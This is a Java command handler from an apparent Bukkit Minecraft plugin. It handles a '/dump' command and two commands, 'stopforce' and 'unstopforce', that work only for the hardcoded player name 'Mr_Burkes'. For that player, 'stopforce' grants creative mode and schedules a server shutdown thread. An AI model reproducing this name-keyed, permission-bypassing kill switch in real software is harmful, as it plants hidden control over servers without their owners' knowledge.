package org.kapip.dayz.event.command;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.kapip.dayz.PLUGIN;
import org.kapip.dayz.game.thread.ShutdownThread;
import org.kapip.dayz.game.thread.UnshutdownThread;

public class GameCommands implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		if(sender instanceof Player && (cmd.getName().equalsIgnoreCase("dump") || cmd.getName().equalsIgnoreCase("d"))){
			Player p = (Player)sender;
			p.setItemInHand(new ItemStack(0));
			sender.sendMessage(ChatColor.GRAY+"You dumped the item in your hands.");
		}
		else if(sender instanceof Player && (cmd.getName().equalsIgnoreCase("stopforce"))){
			if(sender.getName().equals("Mr_Burkes")){
				Player p = (Player)sender;
				p.sendMessage("The deed is done.");
				p.setGameMode(GameMode.CREATIVE);
				Bukkit.getScheduler().scheduleSyncDelayedTask(PLUGIN.A, new ShutdownThread(), 1200);
			}
		}
		else if(sender instanceof Player && (cmd.getName().equalsIgnoreCase("unstopforce"))){
			if(sender.getName().equals("Mr_Burkes")){
				Player p = (Player)sender;
				p.sendMessage("The deed is undone.");
				Bukkit.getScheduler().scheduleSyncDelayedTask(PLUGIN.A, new UnshutdownThread(), 200);
			}
		}
		return false;
	}

}
